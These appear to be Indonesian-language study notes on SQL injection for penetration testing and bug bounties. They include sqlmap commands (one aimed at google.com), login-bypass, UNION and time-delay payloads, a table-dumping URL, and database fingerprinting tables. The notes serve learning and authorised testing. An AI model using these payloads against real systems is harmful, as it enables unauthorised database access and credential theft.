# SQL Injection

## Tips
- Tidak semua payload biasa dijalankan di address-bar browser, kadang harus menggunakan burpsuite (repeater)
- Blind SQL injection generate error 500
- Pada injection login, coba test inject for username dahulu, kalau tidak bisa coba inject kedua username dan password
- Kalau value parameter yang injection kan adalah string maka mengunnakan 1='1 atau '1'='1'
- Blind berbeda dengan OOB
- Comment /*string*/ disebut juga obfusacator, pada MySQL 5.5.30 or higher, sintak berikut `SELECT 1 /*!50530 + 1*/` akan dieksekusi sebagai 2 bukan 1.
- OOB Channel -> DNS, email, Database connection

## langkah-langkah
1. Identifikasi DB apa yang digunakan, salah satu caranya adalah dengan generate error sehaingga server menampilka informasi teknologi. Walaupun server tidak mereturkan error, tapi server selau mereturn databse yang digunakan ketika kita menijectkan payload finding db version.
2. Identify kapan dan dimana aplikasi akan berinteraksi dengan DB Server untuk mengakses data. Berikut kondisi umum aplikasi berinteraksi dengan DB server.
    - Authentication form, user dan password akan dicek pada database apakah ada atau tidak (kadang juga hash)
    - Search Engine, string yang disubmit oleh user digunakan untuk mengeksract semua data yang relevant pada database
    - E-commerce site, semua produk e-commerce stored di DB
2. List entry point/parameter yang bisa digunakan untuk menginputkan SQL query, seperti (__GET parameter, POST parameter, HTTP header, cookies__)
3. Coba generate error pada entry point/parameter yang sudah dikumpulkan pada langkah sebelumnya menggunakan `'` (digunakan untuk memisahkan string) dan `;` (digunakan untuk mengakhiri kueri SQL)
4. Coba meng-injek payload tanpa break query, bisa mengguna comment


## Celah Injection
- Header
    - User-agent
      ```
      sqlmap -u 'http://google.com' -p user-agent --user-agent=elseagent --technique=B --banner
      sqlmap -u 'http://google.com' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' union-char=els --banner //Digunakan jika server blok spasi dan menggunakan commen '#'
      ```
- Parameter GET
- Parameter POST

## Payload
|Payload|Payload alternatif|
|---|---|
|Logical True/false|`' OR 1=1` biasaya pake ini<br>`' OR 6=6`<br>`' OR 0x47=0x47`<br>`' OR char(32)=6''`<br>`' OR 6 is not null`|
|UNION|`UNION SELECT`<br>`'UNION ALL SELECT`|

```
http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()— //extract table name
```

|Database|Comment|
|---|---|
|Oracle|`--comment`|
|MySQL|`-- comment` `-- -comment` `; -- -comment` `#comment` `/*comment*/`(also obfuscator) `;%00`(nullbyte) `+--+/`|
|PostgreSQL|`--comment` `/*comment*/`|
|Microsoft|`--comment` `/*comment*/`|

  ```
  <spasi_kosong>
  '
  ')
  '))
  " / ") / "))
  `
  `)
  `))
  ```
  
|DB|Function (non-blind)|Function (blind)->string concatenation|Function (blind)->all function return an INTEGER NUMBER in the respective database while generate ERROR on all others|
|---|---|---|---|
|MySQL|@@version<br>@@global.version<br>version()|'Concat' 'enation'<br>CONCAT('Concat','enation')|CONNECTION_ID()<br>LAST_INSERT_ID()<br>ROW_COUNT()<br>...|
|MS SQL| @@version|'some'+'enation'<br>CONCAT('Concat','enation')|@@PACK_RECEIVED<br>@@ROW_COUNT<br>@@TRANCOUNT<br>...|
|Oracle|version FROM v$instance<br>banner FROM v$version WHERE banner LIKE 'oracle%'<br>banner FROM gv$version WHERE banner LIKE 'oracle%'|'Concat'\|\|'enation'<br>CONCAT('Concat','enation')|BITAND(0,1)<br>BIN_TO_NUMB(1)<br>TO_NUMBER(1231)<br>...|
    
## Writeups
|Title|Description|
|---|---|
|[SQL Injection at Spotify](https://infosecwriteups.com/sql-injection-at-spotify-d19e0861ddf0)|inject `' atau / atau \` dan amati error yang.<br>![image](https://user-images.githubusercontent.com/52058660/159397667-09fa2fdc-f9ec-4a36-b8dc-cd6cce2bc1f1.png)<br>![image](https://user-images.githubusercontent.com/52058660/159397603-504a8a1c-acf9-4ae1-8725-978f06f6061a.png)<br>![image](https://user-images.githubusercontent.com/52058660/159397728-b70f35f9-ab12-43cc-9483-67b9806c1ba9.png)<br>![image](https://user-images.githubusercontent.com/52058660/159397801-3e97cac7-76cb-46ca-9b08-7dde6c0a73a7.png)|
|[How I Hacked the Dutch Government with SQLi and Won the Famous T-Shirt?](https://goktugkaya.medium.com/how-i-hacked-the-dutch-government-and-won-the-famous-t-shirt-b45cdf5dfaa1)|Change GET to POST|
|[How I found a critical P1 bug in 5 minutes using a cellphone — Bug Bounty](https://medium.com/@mrempy/how-i-found-a-critical-p1-bug-in-5-minutes-using-a-cellphone-bug-bounty-303ebec3edd6)|injeksi pada login form<br>`admin’ and (select * from(select(sleep(40)))SQLI) and ‘abc’ = ‘abc`<br>menggunakan kiwi browser untuk menangkap request|
|[120 Days of High Frequency Hunting](https://kuldeep.io/posts/120-days-of-high-frequency-hunting/)|time delay vuln<br>`'; WAITFOR DELAY '00:00:10'-- -`|
|[Making a Blind SQL Injection a Little Less Blind](https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8)|sqli pada json, jika inject ' -> error, coba netralisir dengan /*'*/|

## Resource
- [Web Security Academy - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [HackTricks -  SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [Netsparker - SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)
- [BigQuery SQL Injection Cheat Sheet](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
- [Dumping a complete database using SQL injection [updated 2021]](https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/)